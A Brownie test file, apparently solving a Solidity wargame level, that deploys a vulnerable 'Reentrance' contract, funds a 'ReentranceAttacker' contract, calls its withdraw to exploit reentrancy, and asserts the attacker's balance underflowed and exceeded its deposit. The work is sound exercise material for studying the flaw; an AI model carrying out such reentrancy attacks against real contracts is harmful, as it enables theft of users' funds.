import brownie


def deploy_reentrance():
    return brownie.Reentrance.deploy({"from": brownie.accounts[0]})


def test_attack():
    # Deploy Reentrance contract
    reentrance = deploy_reentrance()
    assert reentrance.balance() == 0

    # Donate 10 to owner
    reentrance.donate(brownie.accounts[0], {"from": brownie.accounts[0], "value": 10})
    assert reentrance.balance() == 10

    # Deploy Reentrance Attacker contract
    reentrance_attacker = brownie.ReentranceAttacker.deploy(
        reentrance.address, {"from": brownie.accounts[1]}
    )

    # Donate 20 Reentrance Attacker contract
    reentrance.donate(
        reentrance_attacker.address, {"from": brownie.accounts[1], "value": 20}
    )

    assert reentrance.balanceOf(reentrance_attacker.address) == 20
    assert reentrance.balance() == 30

    # ATTACK!!
    reentrance_attacker.withdraw()

    # Just checking that it overflowed
    assert reentrance.balanceOf(reentrance_attacker.address) >= 2**128

    #  Balance should be higher that the 20 donated
    assert reentrance_attacker.balance() >= 20
